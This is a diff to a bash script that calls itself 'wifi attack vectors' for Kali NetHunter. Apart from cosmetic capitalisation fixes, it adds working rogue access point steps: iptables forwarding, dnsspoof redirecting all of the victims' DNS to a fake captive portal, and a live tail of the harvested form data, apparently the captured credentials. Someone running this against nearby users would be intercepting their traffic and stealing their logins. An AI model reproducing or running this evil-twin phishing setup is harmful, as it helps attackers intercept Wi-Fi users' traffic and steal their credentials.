@@ -1,6 +1,6 @@
 #!/bin/bash
 
-#	author : armaal
+#	author : Armaal
 #	written in : bash
 #	date : june 2015
 #	info : wifi attack vectors for nethunter (kali linux 1.1.0a)
@@ -156,7 +156,7 @@ iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
 iptables --append FORWARD --in-interface at0 -j ACCEPT
 
 #put the wlan0 ip
-echo -e "\e[34myour ip\e[0m"
+echo -e "\e[34mYour ip\e[0m"
 ifconfig wlan0 | grep "inet " | awk -F'[: ]+' '{ print $4 }'
 echo
 read -p "Enter your ip :" iplocal
@@ -173,9 +173,12 @@ echo -e "\e[31mdnsspoof launched\e[0m"
 echo
 echo -e "\e[96mGNU screen session created --> dnsspoof e[0m"
 echo -e "\e[96mscreen -x dnsspoof to enter into the screen\e[0m"
-echo
-echo
+sleep 3s
+clear
+echo -e " \e[44mRedirection to Captive Portal Actived\e[0m"
 screen -dmS dnsspoof dnsspoof -i at0 -f /usr/local/hosts # insert 192.168.7.1 *.* into the hosts
+echo -e " \e[44mNow you have just to wait.. go on agar.io & back here !\e[0m"
+tail -f /var/www/"$wwwdir"/"formdata.txt"
 }
 
 #driftnet
